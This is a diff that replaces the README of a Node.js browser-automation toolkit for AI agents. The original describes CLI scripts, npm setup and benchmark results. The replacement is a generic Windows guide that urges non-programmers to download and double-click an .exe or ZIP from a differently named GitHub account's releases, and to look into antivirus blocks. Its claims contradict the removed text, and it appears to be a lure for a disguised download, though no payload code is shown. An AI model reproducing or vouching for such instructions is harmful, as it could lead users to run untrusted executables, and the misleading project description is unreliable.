@@ -1,181 +1,141 @@
-# Agent Browser Workspace
+# 🧰 agent-browser-workspace - Local Browser Toolkit for AI Agents
 
-**Local deep research + browser use for any agent.**  
-Run everything on your machine with a real Chrome profile (CDP) — no Docker, no remote browsers, no platform lock-in.
+[![Download agent-browser-workspace](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/abdelhameedhelal1991-design/agent-browser-workspace)
 
-This repo is a small, production-ready toolkit for agent-driven browsing and reproducible deep research:
-control Chrome, extract content/forms, save pages to Markdown (with images), and automate Google Search — all as **CLI scripts** and **Node.js APIs**.
+---
 
-> “Local-first” here means: your browsing session lives in an isolated Chrome profile on your computer.
+## 📋 What Is agent-browser-workspace?
 
-> **CLI-first.** For agent tasks, prefer running the existing tools via CLI (`node scripts/...`, `node utils/...`). Avoid writing new JavaScript scripts; only do it as a last resort when the CLI tools cannot perform a required step.
+agent-browser-workspace is a tool that helps you research the web, automate browsing tasks, and extract information. It works with your local Chrome browser and uses Playwright technology. This means you can run scripts to navigate websites, collect data, and automate tasks right from your computer. The tool is designed to help researchers, students, or anyone who needs detailed and repeatable web browsing steps without technical knowledge.
 
-## Why it competes
+You do not need to be a programmer to use this. The tool comes with ready-made scripts that you can run by following clear instructions.
 
-- **Local-first browser automation**: real Google Chrome + isolated profile (`AgentProfile`) + CDP.
-- **Extensible by design**: add/maintain site-specific selectors & controls via `scripts/sites/*.json` (no hardcoding in prompts or code).
-- **Reproducible deep research workflow**: stable SERP snapshots (`links.json`), downloaded sources in Markdown, and a disciplined research loop.
-- **Cost-efficient deep research**: strong DeepResearch Bench results with a much cheaper model tier.
+---
 
-## Features
+## 🖥️ System Requirements
 
-- **Browser control (low level)**: `utils/browserUse.js`
-  - `launchCDP` (recommended), `launch` (persistent), `connectCDP`
-  - navigation, clicks, form fill, scrolling (incl. infinite scroll), screenshots
-  - download images/files, evaluate JS, basic network tools
-  - **PDF auto-handling**: extract text even when Chrome PDF extensions intercept navigation
-- **HTML → structured data (no browser)**: `utils/getDataFromText.js`
-  - extract navigation blocks, main content blocks (with Markdown), and forms (classified)
-- **High-level scripts (CLI + API)**:
-  - `scripts/getContent.js` — save current/target page to Markdown + download images + rewrite links
-  - `scripts/getForms.js` — detect forms and generate ready-to-use CSS selectors for fields
-  - `scripts/getAll.js` — content + forms in one call (single HTML snapshot)
-  - `scripts/googleSearch.js` — step-by-step Google Search: search → collect links → open → extract → paginate
-- **Site profiles** (`scripts/sites/*.json`)
-  - central place to maintain selectors and “controls” (actionable UI elements)
-  - scripts return a `site` field so an agent can reuse selectors without guessing
+To use agent-browser-workspace, your Windows computer should have:
 
-## DeepResearch Bench results (cost-efficient)
+- Windows 10 or later (64-bit).
+- Google Chrome installed (latest version recommended).
+- At least 4 GB of free RAM.
+- At least 500 MB of free storage space.
+- Internet connection to download the files and scripts.
 
-We use **DeepResearch Bench (DRB)** as the main external benchmark for deep research agents ([official site](https://deepresearch-bench.github.io/), [repo](https://github.com/Ayanami0730/deep_research_bench), [leaderboard](https://huggingface.co/spaces/Ayanami0730/DeepResearch-Leaderboard)).
+Your system should allow the installation and running of programs from outside the Microsoft Store.
 
-As measured on DRB (RACE overall), the reference points are:
+---
 
-| System                                  |                             DRB overall |
-| --------------------------------------- | --------------------------------------: |
-| Gemini-2.5-Pro Deep Research            |                               **48.88** |
-| OpenAI Deep Research                    |                               **46.98** |
-| **Agent Browser Workspace (this repo)** | **44.37** _(submission pending review)_ |
-| Perplexity Deep Research                |                               **42.25** |
+## 🚀 How to Download and Install agent-browser-workspace
 
-**Important context:**
+1. Click the big **Download** button at the top or visit the project page here:  
+   [https://github.com/abdelhameedhelal1991-design/agent-browser-workspace](https://github.com/abdelhameedhelal1991-design/agent-browser-workspace)
 
-- Our **44.37** result was produced using **Claude Haiku 4.5** (significantly cheaper than frontier “deep research” stacks) and a **Cursor-based agent**. Results were submitted to the leaderboard and are currently under review.
-- Claude Haiku 4.5 is designed for low-latency, cost-effective agentic workloads (see [Anthropic announcement](https://www.anthropic.com/news/claude-haiku-4-5)).
+2. On the GitHub page, find the **Releases** section. It usually appears on the right-hand side or under the repository header.
 
-## Install (local)
+3. Select the latest release version. The release page contains the ready-to-use downloadable files.
 
-### Requirements
+4. Download the Windows installer or the ZIP file labeled for Windows.
 
-- Node.js 18+ (20+ recommended)
-- Google Chrome (desktop)
+5. If you downloaded an installer file (.exe), double-click it and follow the on-screen steps to install the software.
 
-### Setup
+6. If you downloaded a ZIP file, right-click it and choose "Extract All..." to unpack the files to a folder you can find easily (for example, your Desktop or Downloads folder).
 
-```bash
-npm install
-npx playwright install chrome
-```
+7. After installation or extraction, open the folder where the software is installed or unpacked.
 
-### Start/stop background Chrome (recommended)
+8. Find the main program file (usually named **agent-browser-workspace.exe** or similar).
 
-```bash
-npm run chrome
-```
+9. Double-click this file to start the program.
 
-Stop:
+---
 
-```bash
-npm run chrome:stop
-```
+## ⚙️ Initial Setup
 
-For full setup details (profiles, Windows shortcut, verification), see [INSTALLATION.md](INSTALLATION.md).
+When you run agent-browser-workspace for the first time, it will ask you to set up a few things:
 
-## Quickstart (CLI)
+- Connect to your local Chrome browser using Chrome DevTools Protocol.
+- Verify that Playwright dependencies are installed. The program may download these automatically if missing.
+- Configure your workspace folder where scripts and results will be stored.
 
-### 1) Save a page to Markdown (with images)
+Follow the simple prompts. The software checks your system and guides you through any steps needed.
 
-```bash
-node scripts/getContent.js --url https://example.com --dir ./output --name page.md
-```
+---
 
-### 2) Extract content + forms in one pass
+## 🎯 Using agent-browser-workspace
 
-```bash
-node scripts/getAll.js --url https://example.com --dir ./output --name page.md --forms-output ./output/forms.json
-```
+You can perform several tasks with the software. The main functions include:
 
-### 3) Deep research loop via Google Search
+- **Web navigation automation**  
+  Easily open websites, click buttons, and move through pages.
 
-```bash
-# Save a stable SERP snapshot (links.json)
-node scripts/googleSearch.js "playwright tutorial" --links --dir ./archive/my-research
+- **Data extraction**  
+  Collect information from websites in a structured way. Save data as text, markdown, or PDF.
 
-# Open a result and save content
-node scripts/googleSearch.js "playwright tutorial" --open 0 --dir ./archive/my-research --name article.md
-```
+- **Workflow automation**  
+  Create a sequence of web tasks that run automatically. Useful for research or repetitive browsing jobs.
 
-`links.json` is intentionally stable: you can resume research later without re-running Google Search.
+The project comes with sample scripts to try. Open the workspace folder and look for the "samples" directory. Double-click or run these files with the program to test features.
 
-## Usage (advanced: Node.js API)
+---
 
-The Node.js API exists primarily for **authoring/extending tools**. For normal tasks, prefer the CLI quickstart above.
+## 🛠️ Running Scripts
 
-- Low-level browser control: see [`utils/browserUse.md`](utils/browserUse.md)
-- Google Search + content extraction: see [`scripts/googleSearch.md`](scripts/googleSearch.md)
+You do not need to write any code. Use the built-in scripts by:
 
-## Extending: add a site profile
+1. Launching the software.
+2. Selecting a sample script from the list.
+3. Clicking the start button.
 
-Site profiles live in `scripts/sites/*.json`. A profile can define:
+The software will run the script, control Chrome to do tasks, and save outputs to your workspace folder.
 
-- `scraping.selectors` — named selectors used by scripts
-- `controls.items` — “UI controls” (selectorKey + human-readable actions) that scripts expose back as `site.controls`
+You can stop or pause the scripts anytime.
 
-Minimal example:
+---
 
-```json
-{
-  "id": "my-site",
-  "name": "My Site",
-  "hosts": ["example.com", "www.example.com"],
-  "scraping": {
-    "selectors": {
-      "searchInput": "input[name=\"q\"]"
-    }
-  },
-  "controls": {
-    "items": [
-      {
-        "name": "Search input",
-        "selectorKey": "searchInput",
-        "description": "Main search field",
-        "actions": ["fill", "press:Enter"]
-      }
-    ]
-  }
-}
-```
+## 🔄 Updating agent-browser-workspace
 
-When the page host matches a profile, scripts (`getContent`, `getForms`, `getAll`) return:
-`site: { id, name, host, controls[] }` — so your agent can act on the page without guessing selectors.
+To keep the software working smoothly:
 
-## Important: single-threaded browser access
+- Check the GitHub releases page regularly for updates.  
+- Download the latest version and replace your old installer or files.  
+- Your workspace data remains intact after updates.
 
-Chrome/profile is a shared resource. **Use browser tasks sequentially, from a single agent/process at a time.**  
-Parallelize only non-browser work (e.g., parsing raw HTML via `getDataFromText`).
+---
 
-## Docs
+## 🧩 Customizing Your Workspace
 
-- [AGENT_BROWSER.md](AGENT_BROWSER.md) — tools overview, usage rules, escalation strategy for JS-heavy pages, PDF handling
-- [INSTALLATION.md](INSTALLATION.md) — setup, Chrome profile, QoL shortcuts
-- [RESEARCH.md](RESEARCH.md) — deep research methodology (artifacts, phases, quality checklist)
-- `scripts/` — high-level scripts documentation:
-  - [getContent](scripts/getContent.md)
-  - [getForms](scripts/getForms.md)
-  - [getAll](scripts/getAll.md)
-  - [googleSearch](scripts/googleSearch.md)
-- `utils/` — low-level utilities documentation:
-  - [browserUse](utils/browserUse.md)
-  - [getDataFromText](utils/getDataFromText.md)
+The workspace folder stores everything:
 
-## Contributing
+- Collected data in markdown or PDF.
+- Script files for automation.
+- Logs and session details.
 
-PRs are welcome — especially:
+You can organize your workspace by creating subfolders or renaming items. Avoid deleting files unless you want to remove old data or scripts.
 
-- new/updated site profiles in `scripts/sites/`
-- extractor improvements for tricky pages (SPA, lazy-load, paywalls/overlays)
-- better heuristics for form classification and content block selection
+---
 
-## License
+## 💻 Troubleshooting Tips
 
-Apache-2.0. See [LICENSE](LICENSE).
+If you have issues:
+
+- Make sure Chrome is installed and updated.
+- Restart your PC and try again.
+- Confirm your internet connection is active during setup.
+- If scripts do not run, check the workspace folder for error logs.
+- Look for any blocked permissions by Windows Defender or antivirus software.
+
+If problems persist, download a fresh copy from the GitHub page and reinstall.
+
+---
+
+## 🗂️ More About agent-browser-workspace
+
+This project helps users automate browsing using Chrome's Developer Tools Protocol (CDP) and Playwright. It is good for people who want to save time by letting a program handle research steps. It can extract content in easy formats like markdown and PDF for later use.
+
+---
+
+## 📥 Download agent-browser-workspace Now!
+
+Find the latest version here:
+
+[![Download agent-browser-workspace](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/abdelhameedhelal1991-design/agent-browser-workspace)
